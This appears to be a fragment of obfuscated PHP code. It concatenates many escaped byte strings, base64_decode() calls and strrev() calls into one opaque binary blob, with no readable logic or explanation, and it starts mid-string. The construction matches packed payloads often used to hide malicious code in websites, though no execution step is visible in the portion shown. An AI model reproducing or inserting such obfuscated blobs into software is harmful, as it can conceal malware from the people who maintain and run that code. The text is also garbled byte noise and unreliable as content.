øsÿÔ«˘≥ŒÙº¬⁄Êˆ[/W]ÚÊ˝\'')."\300\175\307\36\173\351\263\273\116\371\223\65\364\342\41\235\337\175\330\373\321\370\101\107\155\134\175\153\325\23\333\236\364\134\371\366\334\317\36\116\124\375\163\311\113\337\270\363\341\115\165\373\247"."\323\125\115\277\214\277\367\114\161\341\315\377\276\275\371\217\377\25\271\353\137\133\227\337\33\177\172\373\321\15\117\375\346\302\365\257\136\324\164\371\163\63\136\177\175\255\152\375\354\316\51\133\156".base64_decode('enLg8Vf/9Norf73ijtf+/M/s6709fTXL1/7olfjM85767cft82rePX3HtNvSvmt3DZ992y8=')."\352\376\163\316\221\213\357\175\270\170\200\165\370\1\177\371\360\352\47\336\70\174\264\341\326\336\231\263\356\276\376\33\7\375\354\375\357\257\253\71\177\375\245\247\234\176\302\303\301\23\106\207\216"."\275\375\251\235\253\57\371\257\375\157\350\375\316\366\253\157\273\373\300\5\373\265\74\172\315\223\47\157\174\171\373\241\33\246\264\74\164\360\147\243\117\374\361\321\304\170\344\265\143\336\273\355\365"."\270\162\124\326\137\167\310\133\37\234\60\163\360\327\137\313\327\174\76\355\314\227\237\51\56\371\305\171\103\247\225\256\174\341\274\376\164\146\363\45\221\344\312\367\157\135\161\216\357\273\37\376\355"."\xd5\xc3\x1f\x18\x79\x74\xd9\x2d\xbf\xab\xef\x98\x7e\xd4\xb7\x9e\xf0\x7e\x63\xd5\x73\xcd\x1f\x3f\x7e\xca\x4b\xed\xbf\xfd\xc1\xc6\x25\x47\xe6\x1e\x5c\xbb\x74\x42\x7b\xbc\x6b\xe4\x57\xed\x3b\xe\x39\xf6\xc3\x8f\xd5"."\x4d\x3\xbf\xba\x3c\x7b\xf5\x1b\xcf\x84\xce\x5b\x66\x5f\xf1\xb6\x72\xf1\x51\x87\x6\xae\x38\xe0\xf8\x37\xbe\x36\xe7\x9f\x1e\xff\xb3\xab\x7f\xd2\xd9\xf8\x1f\x8f\x2c\xef\x58\x71\x70\xb2\xfa\xca\x5d\x1f\x1c\x7e\x4c".base64_decode('T4MnNeXyZ6tnPr15/3v+ttPz8oKjTqhPP178+Y2/915f+8qOvVd+a279px++/e/Xn1l11nc=')."\217\373\170\323\61\307\35\367\376\67\337\117\377\341\340\355\267\117\171\342\323\117\157\374\150\277\216\163\127\376\354\256\265\207\255\70\346\331\216\345\177\236\161\365\226\241\347\137\235\233\116\357\373"."\xee\xd4\xf\xac\x4f\x1e\x3c\x6d\xc9\xcd\xf7\xdc\x79\xdf\x47\x7b\x2f\xa8\x5e\x7b\xd0\x75\xff\x6c\xbc\x61\xc3\x9a\xcb\xad\x67\xcf\xd8\xee\xf9\x76\xff\xb1\x3\xe1\xff\x58\xf4\xc5\x5d\x37\x6c\xf9\xec\xb5\x89\x6b\xb7".base64_decode('Rvb9dNWC95/S696fvu+Pjx85+1v3HP+vbZ2d048JHLr4NfvR4Gjf61Wb7LcP/+9vjb18yXc=').base64_decode('Qh9897GBix8+Ycqvrmm44AC9+94Nnz9/blpd/dnnt//Mv2nj539eseeLT1//pO04ddM/3n0=')."\63\372\305\347\23\217\125\355\171\376\27\7\234\363\361\113\57\356\271\364\213\117\32\76\376\364\137\376\113\167\256\136\275\351\203\207\77\61\277\50\174\376\367\263\56\125\377\375\326\137\376\47\372".base64_decode('xRd/en501REvfdb08nP21NqJn//pfzJddWb2T6NX7nzw39fs+qTz3tjNf33vpX8ecvRZzy4=')."\277\377\305\277\176\270\355\374\350\173\257\237\362\265\377\270\157\237\147\377\374\353\165\215\255\167\235\366\372\201\177\337\161\112\303\325\317\76\137\377\352\207\275\233\222\267\357\352\216\344\276\130\231"."\x99\xb9\x61\x7a\xac\xf6\x8b\xf3\xa6\xda\xfb\x5f\x33\xfe\xd\xad\xf1\xe5\xc8\x77\x3d\x57\xdc\xfc\xe6\xd2\xf6\xfa\x5d\xa9\xec\xf7\xfe\x92\xf2\xcd\x56\xec\x1f\x9d\x93\x7b\x68\xcd\x67\xde\x42\x69\xc5\x15\x1f\x1c\xce"."\336\362\315\257\133\0\274\147\251\150\16\14\61\275\272\44\142\61\331\341\21\336\371\314\233\15\314\123\146\40\231\37\114\201\214\1\244\161\165\165\163\200\317\135\73\66\62\310\164\322\207\223\151"."\xdd\xd2\xe0\x32\xf9\xc4\x79\xd0\x52\xca\xc8\xf\x6a\xa3\x20\xc5\x9a\x3b\x17\xee\x84\x41\xf6\x3c\x34\x68\x8d\x8c\xe6\x81\x1f\xb6\x47\xd3\xfd\x66\x96\x49\x24\xd7\xe\x8f\x8d\x18\x90\x72\x62\x3d\x34\x6c\xac\xcb\xc"."\147\373\101\330\125\127\13\212\233\105\173\320\114\217\61\21\230\61\226\311\215\262\273\131\43\327\77\234\136\113\3\203\46\352\56\123\166\31\112\16\352\45\246\251\72\64\130\30\116\331\60\214\101"."\xdd\xce\xf1\xcb\xdd\xd9\xb5\x73\xd8\x31\x28\x3f\xaa\xa7\x41\x68\x98\x1d\x49\xa6\x4a\x6b\x21\xd0\x3f\x36\x6a\xe7\x98\x7e\xc8\x89\x2c\xbf\xb1\x76\x5d\x9e\xbf\x95\x33\xc6\xec\x64\x71\x1d\x74\x70\x41\x2d\x83\xe2\x7c".strrev('ÄES”H``PπÇ'."\0".'<˛oê9ƒËP2G˙◊Z'."\0".'÷¡~±@"sò:˙µ≠∞”6b…q'."\0".'')."\352\230\65\222\34\142\7\265\5\363\241\252\165\166\1\115\161\206\101\25\346\246\337\310\254\35\263\100\11\173\336\134\326\127\135\33\352\117\215\261\326\346\262\252\350\157\336\260\13\143\203\120\323"."\xfc\x13\x1\x97\xe6\xd6\x43\x43\x43\x7a\xbe\xd4\x6f\xc1\x95\xf6\xbc\x7a\xf6\x2a\x2d\x97\x4e\x1a\x23\x4c\x82\x3b\xb2\xd6\x4a\x96\xe0\xda\x74\xe\x43\xa2\x79\x27\xce\x61\xfd\x80\x8f\xf4\xba\xfe\xd2\x58\x41\x63\xf8".base64_decode('CFXNZsMfy9mDWj+0hIah2QWoc349Q8HZJ0Ir80FNMDWSNNeyO+w5C6DTa5Mj+hCThcydA3A=').base64_decode('GBhZh5AG2q+fw1SISxk9W4Sj2onzAJKz6+azYUA/59RC25Zur8uk+dGwf122mGYtQd66edA=')."\344\374\271\120\337\230\76\230\32\60\207\30\242\25\322\131\23\360\45\227\32\54\345\323\32\3\6\100\17\325\232\267\31\356\316\343\363\233\62\323\132\16\104\70\143\103\303\232\76\10\360\252\233"."\xd\xd3\x3a\x36\x38\x3a\x9c\xcb\xc0\xf2\x59\xc0\x71\xc\x7e\xad\x5c\x7f\x6a\x80\xa9\x55\x64\xd2\x6b\x8d\xac\x9\xeb\x75\x2c\xdb\x3f\xcc\xdf\x29\xce\x63\xa3\xd7\x52\x23\xeb\x2c\x76\xb8\x1b\x19\x4c\x8d\x9a\xac\xea"."\71\47\316\145\0\2\100\316\231\13\61\303\103\151\273\337\2\364\235\73\27\300\66\72\66\234\34\31\4\110\351\10\351\122\214\210\314\146\130\125\317\146\27\20\246\324\237\54\30\153\201\342\315"."\136\300\46\142\1\133\140\154\61\16\131\171\303\34\35\141\63\127\317\46\214\341\35\102\5\256\244\275\166\254\150\254\313\1\140\327\15\215\16\346\323\354\301\134\66\251\227\6\331\133\332\321\376"."\301\42\173\147\226\322\21\222\214\260\365\275\240\216\315\25\340\140\141\310\136\247\145\331\15\335\154\0\107\176\300\56\25\206\0\203\347\326\103\247\352\27\300\307\174\206\42\153\7\314\376\344\10".base64_decode('AH72fIChXUrm1zKR4Dp7AKEoYFyzlhxksmyuKi1rIFMtNCr5ky9/2LNOI+/LaXmuAdQOGCQ=').strrev('Ù=√£'."\0".'≥~\\jG!FJ[yíZÂ∆'."\n".'6í6EÄjBí∞Çﬁû|Ö”ëºC?(	.Ö∞'."\0".'{:Í'."\r".'«').base64_decode('yaNelWO64RVuU0GwbFkjZhEgNmimklmzlHLUmur3VYAkHUmllAF3PNdeEhU6FPBZnANq/WQ=')."\106\271\252\24\376\3\375\246\17\251\55\254\2\317\337\324\261\273\70\347\203\145\132\207\217\115\127\277\204\44\364\362\301\326\254\101\237\34\355\225\123\215\74\32\105\66\353\163\76\270\307\57\337"."\xbb\xbb\xd4\x44\x20\xbe\x54\x52\x4c\xc4\x2f\xb3\x1d\x5d\x29\x1b\x9d\x98\x4a\x9\xae\xf2\x8c\x3a\x21\xc1\x30\x66\xef\xce\xfb\xc7\xb7\x5d\x32\x71\xf1\xae\x89\xad\xb7\x8c\xdf\x77\xe1\xde\x5b\x76\x8d\x3f\x78\x31\xa".base64_decode('7r7n/PFbrnn78jN237N19z2b9551x/sPnDe+befe0x4cv2rH+A1n7b7/wb2/PGvPjnN333M=')."\xf3\xc4\x55\x67\x8f\x9f\x71\xd7\xee\xfb\x2f\x19\xff\xfe\x75\xe3\x67\x6d\x9b\xb8\x70\xeb\xee\x7\xaf\x42\xf9\x27\xbe\x2f\x6a\x46\xd9\xc6\x6f\xbe\xc\x97\x7d\x60\xcb\xf8\x3d\xf7\xec\xfd\xe1\xe\x9e\xfa\xfe\x3\xa7"."\xc2\x9a\x83\x1d\xb1\x4d\xb7\x95\xf8\xb2\x8\xd3\x36\x23\x68\xaa\x2c\x52\x0\x41\x75\xcb\xa7\x74\x65\x75\x4\x31\x85\x3c\xf7\xc6\xaa\x69\x76\x46\x2f\x2a\x36\x51\x51\xd3\xd0\xdf\xbc\x99\xf7\x52\x4\xa4\xc6\x2\x2c".base64_decode('xcjjZIXB2seRNKHnChjVAEp++iLX8bhDwsdKYKYJFbALw1rMVTX+hKtGLJVUBjQUkWpQBlA=')."\61\166\35\323\247\330\46\373\316\215\361\111\167\55\212\212\323\312\273\301\246\66\155\63\214\21\62\153\350\230\364\152\207\136\14\225\241\24\131\145\116\22\341\130\177\116\342\42\47\71\41\1\102".base64_decode('ZaIW4VFoVzwKuQxXnE/PsZoDUx2Q14zc/aJeyPI7MCyXrQhE1xDiFcDFB+FIROuxZFfIKEM=')."\125\26\126\33\146\60\213\10\234\270\245\45\12\11\242\273\64\50\204\344\250\41\116\37\213\172\312\140\312\322\172\216\344\4\272\350\223\256\250\350\103\54\256\261\235\104\150\137\164\334\276\65\56"."\56\144\12\330\336\210\275\160\61\74\175\140\217\365\244\76\300\267\170\163\46\307\146\335\67\172\174\221\264\64\113\126\77\160\266\6\257\327\53\111\236\205\272\34\376\122\331\300\310\343\241\170\246"."\x64\x63\xad\x90\xb6\xac\xd9\xcf\xd0\x44\x5c\x97\xa3\xec\x21\xbc\xb8\x27\x8b\x6f\xe1\x5a\x24\x68\xd5\xa7\xd1\x79\xc9\x6e\x20\xaf\x7a\x95\x59\xa\x1a\xc3\x7c\x5f\x1d\xfa\x20\xeb\x63\xae\xef\x44\xf4\x49\x80\x9\x6b"."\xba\x17\x0\x5c\xb2\xd8\x43\xaa\xe9\xbe\x39\xc0\x9e\x5b\xb\xe1\xda\x74\x21\x21\x2d\x4d\xd2\xc8\x20\x5e\x94\x2a\xe5\xb3\x2c\x16\x7d\xa2\x2c\xb1\x52\x1e\x23\x42\x83\x13\x1c\x7a\x3e\x25\x15\x5a\xa8\x25\x6d\xa9\x56"."\165\0\340\355\23\240\322\146\211\164\75\5\157\25\375\22\0\107\40\3\53\333\341\104\17\64\176\57\307\30\64\363\150\103\112\131\104\43\27\66\24\250\322\222\14\40\304\4\262\341\342\4\134"."\137\122\324\226\261\241\200\66\275\74\127\305\265\262\32\343\220\54\374\322\45\257\163\324\54\131\362\153\4\135\254\156\254\304\256\242\215\337\22\110\255\246\330\231\65\22\156\126\133\302\61\121\116"."\x2d\x94\xdc\x96\x41\x64\x13\x3a\x81\xae\xb0\x1a\x8f\x47\x25\x3b\x21\xf0\xd4\x67\x69\xb4\x45\xd\x46\xa3\x4b\xc3\x80\xaf\xd\x12\xfd\xc4\xaf\x3b\xc5\xed\x3a\xe\x89\x57\x9e\xf8\xa2\x49\xd6\xac\x93\x19\x16\x6c\xdc".strrev('h¡(WG¥'."\n".'Ó`707”P‹LbOD≥CÈ¯™'."\r".'E‰NØ≠_\\¿¸b∂ä—P4q¬o')."\244\273\243\63\116\55\273\320\370\316\250\224\116\364\274\41\231\31\300\51\117\206\352\103\135\221\100\60\244\204\73\23\121\366\164\203\53\330\222\107\73\161\36\146\40\50\132\72\67\160\3\345\151"."\100\176\130\44\327\310\153\2\154\356\361\124\365\116\353\235\331\133\335\133\263\306\327\153\365\1\111\42\63\142\310\323\3\201\256\26\30\136\3\377\112\261\303\114\107\34\261\2\364\63\32\13\4"."\43\254\53\315\201\70\174\106\203\141\372\261\347\242\133\167\337\167\376\236\53\157\31\77\173\53\252\150\342\212\55\23\227\336\205\30\30\314\264\334\162\336\236\137\234\77\161\321\316\211\363\200\331"."\x50\xf6\xee\xbc\x7b\xf7\x83\xbf\xdc\x73\xd1\x8e\xf1\x5b\x2e\x9b\xb8\xe4\xde\x3d\x57\x9c\x4e\x13\xde\xbe\xe9\xd6\xf1\x73\x76\xf0\x8e\x29\x6f\x5f\xf8\x8b\x89\xf3\x6f\xe4\x8c\xc\xe5\x5f\x3c\xa8\xf4\xdb\x67\x6c\xdd"."\363\340\55\230\215\271\176\363\304\235\347\116\134\265\165\374\234\37\216\137\276\143\317\371\73\307\177\164\332\370\231\133\367\356\274\170\252\33\221\150\270\207\115\5\74\60\367\257\306\306\1\50\170"."\173\255\131\30\264\65\350\267\32\277\13\101\277\114\275\235\50\72\57\353\16\165\6\103\356\227\125\162\20\254\3\315\244\30\102\165\177\200\237\265\300\272\20\13\23\53\35\115\125\223\366\142\3".base64_decode('zL/UKakzLaF4MBZuDsHLAz5R0wnXBeobKDYeW86/+QvcMmtOSjVD5hrFMRDNlzSzpVyedFY=')."\231\206\25\321\246\171\360\56\105\236\171\51\323\360\216\213\42\164\154\122\240\32\333\120\41\372\312\125\253\252\74\265\236\272\32\5\114\75\321\22\140\340\111\231\6\152\357\274\234\243\21\117\277"."\x23\x54\xe7\xa9\xad\x51\xa6\x15\x6\xa7\x41\xbf\x4\x5c\x51\xef\x55\x9a\xd3\x52\x34\x4f\x35\x74\x58\xee\xae\xc8\x8b\xc8\x98\x65\x17\x35\x3\xd1\x35\x25\xe9\xe1\x51\xbc\x3c\xfa\x75\x18\x6d\x4a\xfa\x44\x9\x3a\x4f"."\50\207\73\116\11\164\266\70\163\122\133\117\135\125\104\153\64\351\263\271\61\26\66\315\125\65\112\77\274\347\250\220\110\212\71\200\321\344\0\106\365\54\240\23\135\155\174\276\351\143\15\205\276".strrev('JŒg!ú£MpåFê¨IÛ«f¿û#ë	Ø1¯)‡˙?4944MybŸ“«'."\n".'¶KQ6,“›£ﬁ').strrev('Ò;ÖÚH ò.] /ÑP8©¿*à”˝SÕ	qÂäv¡Ü!ﬂâ,\\UäÊ\\01ÒV:ÜR3')."\x23\x55\xfa\xfe\x2e\x1e\x6c\xf\x75\x4\x7c\x40\xc4\x29\x26\xd0\xfc\x98\x17\x53\x9a\x94\x2a\x4c\xf9\x68\x54\x95\x3\xfc\xa4\x21\x6\xb2\x4\x69\x15\xad\x2b\xd5\x46\xdc\x13\x85\x42\x21\xd\x9d\x81\xd9\x57\x88\x5"."\x4\x8d\x14\x69\xaa\xa2\x46\x6a\xa0\x4a\x6e\x6b\x2e\x1a\x4b\xa8\x8\x0\x40\x9e\x25\xaa\x5b\x25\xed\x16\x92\x6e\x3b\x7e\x54\x36\xcc\x18\xbe\x1\xc4\xe\x99\xcc\xdc\x4e\xaa\x9f\x99\xa4\x43\x95\xe3\x3a\x83\xd1\xce"."\326\60\173\152\330\2\247\350\102\312\164\144\152\211\205\261\15\22\150\137\141\125\111\17\74\121\100\50\213\240\100\201\11\166\320\267\60\353\200\23\370\236\217\2\142\313\107\1\276\331\340\134\222".base64_decode('7TzcfryTfwtmGAW64+yZCaa+K1r4dzt/kI0TojEpEIgFOuI8GFvBn63wOPp8Re3s7hAUPxI=').strrev('¢F¢,≤∑ñ3»∆v[pÚ±∑ôGù}o™^¸!bNI˙@€Èzkãôæ’’˛+NÕ‡ %êéX')."\155\64\114\154\372\205\362\51\161\166\121\172\24\304\377\46\4\377\153\261\255\213\257\6\5\341\260\102\237\30\53\235\321\25\1\141\46\116\112\200\30\141\65\316\277\272\247\167\244\327\207\230\5".base64_decode('a41469fSrDA2hJhxAVEAlA6wbXSNB3YMNWummYElRBA3ALtAf1eyD0IroUCSPB8f5Z0IeE8=')."\126\173\67\364\316\350\365\372\350\3\113\314\274\364\172\104\227\324\320\112\264\307\306\343\216\327\241\152\16\277\76\207\332\321\50\341\213\256\132\32\150\204\37\70\235\65\302\361\0\202\213\232\370".base64_decode('ZIaWbehEf9sSG0LobwT9RBJougyeAS3JSHhpaAP+RyTUcEDS11POAuHODehfRGA2hDvdlTU=')."\207\22\53\102\41\232\201\175\303\257\310\212\10\16\14\125\262\371\210\137\64\100\262\170\341\0\125\253\152\65\1\246\267\157\126\215\252\372\255\156\300\27\156\221\244\272\352\204\272\52\330\103\2"."\xf1\xe0\x6\x4e\x7d\x1d\x8\x51\x8e\xb\xe4\xfd\x81\x13\x11\xb8\x25\x43\x8\xb7\xc5\xa2\xdd\x5d\x52\xb8\x3d\xb0\x3c\xdc\xd9\xc6\x42\xfe\x99\xec\x6b\x26\x54\xad\xb4\x84\xe3\x8\x44\x41\x86\x8c\xc2\xc0\xa2\x1c\xa6"."\337\224\55\222\271\136\7\112\267\40\312\216\2\22\313\216\17\3\224\62\73\127\131\163\167\70\322\42\77\201\307\31\351\327\164\102\325\141\117\231\316\72\307\302\344\61\74\13\140\220\263\157\202"."\156\54\100\140\300\2\24\0\54\104\300\305\2\304\220\43\13\220\201\262\0\76\235\204\72\131\32\72\52\242\143\36\73\377\145\264\141\176\351\267\60\325\57\231\53\301\64\330\107\245\147\330\236"."\15\72\276\151\134\176\352\22\170\22\131\225\164\376\247\212\205\212\364\224\34\113\116\45\371\222\237\346\100\314\47\311\203\176\173\327\54\46\314\361\32\206\247\364\61\263\235\60\354\254\243\121\170".base64_decode('6ogaDZOXplKz7EkIERSqpiS8Jvu2HCFEU1TSDVJdIfnB+pVE3kuDzhMVJ1Nr+EEJzFh44Bc=')."\172\164\60\375\351\205\40\23\145\364\102\43\125\36\330\164\173\31\303\336\323\73\132\133\353\105\377\314\107\177\233\321\337\40\372\33\302\21\255\275\243\47\266\242\217\5\255\175\176\270\225\356\355".base64_decode('nTYZOCEDAyoEp9EgKwWQRntkMoPt5ah2jknQyWFOCKmpEF2EW2LRLsqxKOFWhVqRUKqo2L0=')."\12\130\261\140\54\204\127\23\315\305\322\252\253\34\2\256\105\125\12\74\60\257\161\226\12\167\266\204\126\52\125\106\152\124\325\64\25\12\53\150\355\262\212\224\262\232\130\15\264\257\160\317\145"."\145\314\21\105\106\107\166\276\16\322\270\204\100\321\62\126\216\330\203\140\117\170\75\160\210\347\51\224\203\246\111\341\70\332\340\43\21\62\122\224\144\130\230\361\365\50\334\154\3\216\304\207\25"."\52\54\205\212\130\2\255\210\46\205\126\46\142\1\34\111\270\325\51\7\242\77\204\0\341\323\124\61\247\321\167\255\204\307\363\255\1\241\302\32\7\113\111\231\115\314\124\2\206\221\55\122\32"."\23\117\41\222\5\12\146\131\356\260\24\270\164\32\352\212\205\73\2\261\125\0\62\161\146\200\45\152\146\35\257\233\105\300\260\272\245\227\366\235\250\327\362\313\173\72\307\33\30\105\106\347\337"."\xd\x40\x91\x51\x6f\xe8\xe7\x34\x3c\xf3\xf4\x13\xec\xf4\xaa\xfc\xf9\x34\x13\xba\x54\xb3\x67\xc8\x1e\xf6\xc1\x4c\x58\x90\x17\x5e\xb0\xc6\xac\x1c\x22\x51\x3c\x24\x66\xd\x70\x1f\x66\x45\x4e\x95\xdf\xa8\x9\x43\xc2".strrev('2Ûc [4Ëı’kRëÖœUëÄ∞‚"∏çÒ1•ÑkJ”÷¨ó’hie*'."\0".'1»éË‘ ì≈Sx').base64_decode('TKgoHnsP47fZWrG6fi4rxPpOQ4HuRFRFu1IshPeIsrFIZ3h5wqAwzsAtNn/JsFmeSsPm5bk=').base64_decode('FCvU2RbuDDXhh+SIV2DdBTkdtgw6H+oJR9UI4q9VWRQXjoLc2GF2UlWF1RafJhTW7WJJMuI=')."\x67\x98\x44\x39\xbc\x83\xbf\x23\x21\xda\xec\x8\x59\x2\xc2\x76\x3\x97\x6d\x93\xb4\x52\x3f\x2e\x2d\x6f\x7d\x50\xde\x65\xdd\xd5\x30\x1b\x70\xa\xce\x4c\x39\x9e\x85\x22\xbb\xea\x68\xdc\xad\xd\x2e\x47\xb\x45\x75".base64_decode('cVvMLqS5EUAo0C3ZXsCFFdYguR/KO7uHNtsssxKm6mI0Od2y+K1xIqMrVkFPEnOiChjBU1I=')."\xa6\x6e\x9\x1b\xe9\x0\x7b\x72\xe6\x62\x9f\x76\x46\x58\xa9\x90\xed\xf0\xb6\x34\x33\x20\x97\xf2\x76\x5c\xcf\x82\x4c\xbf\xa5\x9f\xbc\x8\x10\xcf\xfe\xc4\xa3\x2a\xe9\xa5\x0\xb9\xb5\x11\x33\x47\xad\xb\xba\xa\x42"."\115\141\16\32\51\227\210\214\10\303\273\370\222\104\324\331\307\44\7\2\36\353\14\266\101\272\257\25\171\47\363\146\227\136\314\31\344\146\150\205\270\370\201\75\10\125\100\347\337\347\176\357\45"."\103\35\337\46\226\345\304\326\70\276\154\16\231\135\53\322\63\351\315\47\16\62\242\220\163\274\51\53\345\121\43\136\371\201\25\302\35\22\51\75\351\140\246\30\151\350\104\120\340\100\370\11\37".strrev('1ÁÓ<¸(ürÂÛl\'√PlÜ€Årô'."\n".'c*üŸY+~M)'."\n".'Ú∑òùH{÷‚ñEøaài')."\xdb\x3e\xa0\x4a\x7d\xe9\xe2\xf9\x85\xd5\x52\xa\xd\x69\x1a\x48\x4\xfd\x24\xb\x5c\x69\x10\x9d\x68\x37\x30\xfe\x8f\x49\xb8\x23\xc5\x76\x30\x13\x53\x60\x39\x39\x62\x2\x83\x8d\xdf\xa4\xe8\x36\x98\x1b\x73\xd0\xa7".strrev(' ê≤æÈÔ#'."\0".'é¶0nØß¢$X7ëêÇÂäîêì—„%∫Ö’˜µ ®ì√q	∑>ã¿¸t˙ p')."\261\244\45\122\110\42\313\256\62\4\35\351\333\37\230\371\14\44\13\34\103\173\101\147\124\155\107\333\115\224\61\54\206\225\160\220\167\126\12\110\210\215\370\251\244\237\74\154\206\343\343\102\242".base64_decode('f0BvRGGy1yPKzb+YTglYLBOMQoD+rMqlvKjjgHUp3eZ2o8hLUQA/7rP0LDzHCeyIZC1WG9Y=').base64_decode('8fM5JpwpU8eBoZQPDrqIb8/i0e4Yu+nBYSzhUmOh4Cp+6cJjWwPL3TFhLKEMtFWM5nIzHE8=')."\xe\xa8\x6a\x2c\x8a\x5\x8c\xa1\x48\xab\xab\x40\xbc\x9d\x5b\x1a\x76\xc6\xa9\x91\x70\xe7\xd2\x8a\x9\x88\x21\xe9\x90\x8a\xd0\xc8\x70\x22\xd4\xe1\x8e\x73\xd6\x10\xf\x5\x62\xcc\xc\x36\xe\x37\x47\xa2\x41\x29\x39"."\34\55\207\4\347\170\170\44\25\117\322\110\377\352\352\336\365\344\304\324\200\16\116\251\15\130\216\341\125\373\146\325\54\356\335\130\123\335\353\137\354\233\311\305\157\224\134\111\317\217\47\211\266"."\xd8\xe6\xd3\xe0\x8e\xc0\xfb\x16\x8b\xa4\xc5\x20\xe4\xf7\xf9\xa0\x11\xfe\xe1\xef\xf5\x33\xe3\x64\x7e\x91\x8\xbf\x22\xff\xf1\x1b\x9c\x7b\xc\x98\x9d\x8f\x53\x4b\x4f\x8e\x8e\xba\xcc\xa0\x30\xbb\x3\x3e\xf7\x1b\x37"."\225\75\154\203\40\176\350\254\362\25\210\57\161\325\370\252\70\237\53\147\234\3\43\51\116\313\352\27\256\314\350\157\227\234\25\153\366\124\314\350\100\151\307\263\157\71\312\147\230\142\265\210\145"."\x9d\x32\x93\x25\x6c\x5b\x4a\xcc\x91\x78\x24\x8e\xa2\x7c\x8e\x2a\x10\x41\x1f\x14\x32\x2\x58\x95\x71\xb6\x7a\xf3\x68\xaf\x84\xcd\x38\x88\xb8\xd6\xb6\xf6\xf0\x92\xa5\x91\x8e\xce\x68\xd7\xb2\x58\x3c\xd1\xbd\x7c\xc5".strrev('˘µ¢NWı1S¡êTos3\'Õà∆â9ôóÂ∫$éXπò∫¸GÎ¬∞e‚ÄÕ!Å¥4`U ')."\x73\x79\xbb\x6e\x92\x1c\x5d\x45\xbd\xdf\x34\xed\x49\x52\x97\x77\x7c\x79\xc5\x90\xd8\xd3\x6b\xf5\x71\x2c\x4d\xe9\xc3\x6c\xd0\x3a\x53\x20\xe7\x5c\xa1\x25\xce\x63\xc0\x6d\x78\x65\x1f\x8\x18\x6d\x65\xc6\x31\xd5\xef".base64_decode('YgsgQvgFkZgHEcktadPgmC70Dc0RyRI1Wz2oOLBUYBm3DRuCZYZfh4g5T7ct0CGvNuhIF9Y=')."\xa9\x87\xbc\xe8\x4\xeb\x8\xbb\xec\x81\xce\x20\x5b\x41\x87\x99\x2e\xd6\xfb\x6d\xdc\xcf\x3c\xda\x3e\xa0\x2f\xc0\x50\xc8\xab\x85\x6c\x29\x5c\x91\x8\x6f\x5c\xed\xae\xb5\xca\x23\xb9\x39\x91\x38\x51\xb3\x6c\x50\xe6".base64_decode('gE+BVsR6p5Qeyk2D/B9zYsQsPg16FGG9m0lunWa52XLBQjbpMW9SNibBiG9uUGim5Qa50kg=')."\xd2\xc1\x7c\xe0\x7d\xbe\x55\x52\x60\x13\xfc\x5\x38\xfe\x40\x69\xcd\x63\x4c\x25\x17\x9e\xc8\x36\x8f\xc5\x24\xd7\x4b\xe\x43\x1e\xb2\xab\x14\xad\x50\x8\x66\xf0\x18\x1c\x6b\xd8\x11\x95\x94\x3\x3\x58\xd5\x45\x56"."\230\161\332\6\107\311\55\224\311\113\361\374\226\370\342\306\276\7\44\63\340\145\65\40\206\60\37\142\326\0\312\122\21\367\150\210\344\57\357\113\7\1\57\317\14\7\10\130\23\260\22\361\215"."\77\40\334\250\327\264\54\157\241\150\142\225\271\46\43\227\366\133\43\220\226\325\54\173\271\303\300\322\127\332\377\306\166\104\72\70\73\15\135\30\365\22\254\146\215\100\121\34\345\57\22\225\42"."\317\10\154\37\36\142\4\124\255\145\10\343\107\175\363\143\33\221\204\357\345\232\156\321\70\273\54\162\216\236\352\24\111\47\161\60\116\327\306\124\173\270\251\155\141\140\231\312\370\351\267\60\114".base64_decode('jNj3QBqbVTHzzKEPdbUg22VP6aS73BqAZNIcu/tAS50pA0rGzRFDmObTSEwOy6YjMci9OYc=')."\227\17\72\101\116\223\341\226\256\17\62\345\105\74\333\202\242\24\271\145\167\172\365\353\255\30\341\225\324\21\351\172\222\274\77\340\346\100\16\220\241\176\45\240\277\364\347\344\112\275\367\26\205"."\261\165\64\73\324\113\305\122\175\214\31\305\376\162\273\332\275\155\275\35\275\11\171\270\166\121\33\30\100\235\225\214\302\362\111\24\326\325\1\223\210\267\26\66\374\311\155\263\303\235\306\214\212".base64_decode('pt0hMUbHHcQnr1HsSkNYJO2ORRwXVZCVjXBdxhtkmmBmKZsip1nUlJlFB3lxZT1x6XUTt18=').base64_decode('vPeX10ycf+Pue+6fuOo+Gk8h1qLn+bxPnPuDPfdfvfeWX7596S3vP3De3p13Y5Wka2+kGko=').strrev('›ÔóEˆˆÿ∆∫‚dZ\'%”'."\r".'FòûNVº⁄ﬂ€ÂˆˆüWÌæ‚}<Ô{9€|kº\\L∂€„')."\271\123\312\157\143\205\271\254\264\164\320\54\216\237\171\306\333\247\355\30\337\166\301\236\213\256\55\53\100\33\160\317\63\36\336\305\337\337\163\305\351\122\212\273\120\63\61\27\57\216\360\274\14".strrev('‰U¬*Óπ™Vœ}Ÿ¡\\∑„Yﬁq?K≤Y¶d•„4ÍrÔ˚Ó÷r\\M'."\n".'ˇQπvOœuæﬂM')."\x78\x7e\x5a\x7f\x79\xfe\x38\xc3\xe8\x16\x53\xb7\xd0\x3e\xda\xa1\xd9\x49\x58\xc4\x7b\x6e\xfe\x5\xea\xf\x85\x98\x3c\x73\xe3\x3b\xcf\xdc\x73\xdd\xa9\x7b\x6e\x3e\x1b\x66\xe2\xb2\x9d\xe3\xdb\x7f\x3c\x71\xf3\xf5\x7b".base64_decode('fngLrxawyqG7iyu4dcveu86YuPQunhEv+ZQi8hCMonmwlj5pcM+DF+y5/yqMJOds2bPl3vE=')."\xab\x76\x8d\x5f\xbd\x99\x37\x3b\x7e\xcf\x3d\x2\xca\x51\x3f\x71\x78\x56\x81\xd8\x2e\xc3\xf1\x40\x6e\x7\x84\x2\x68\xa1\x24\xf9\x6\x94\x9\x1c\x66\xc9\xb8\x8e\x27\x16\x52\x51\x57\xf\x8c\xd3\x22\x5e\x19\xc0\x63".strrev('gyíÏiŸ`5&®N”§ƒÒ1ÑÑ”<”5øF®N”'."\r".'iŒë'."\r".'?[≠=ìf˘é¥[P')."\261\360\100\164\273\30\121\17\351\202\163\61\331\206\360\46\127\357\257\367\263\215\157\361\20\156\121\370\371\352\346\373\215\340\7\351\316\103\35\264\260\133\320\116\335\36\61\213\262\26\164\75\173".strrev('Ùñg2≥Ÿã»Ç•ÁvoKÌ˝∏œ∆€Ó˝ëÿœT˝É§r÷˚pÁTzÄ^‰ 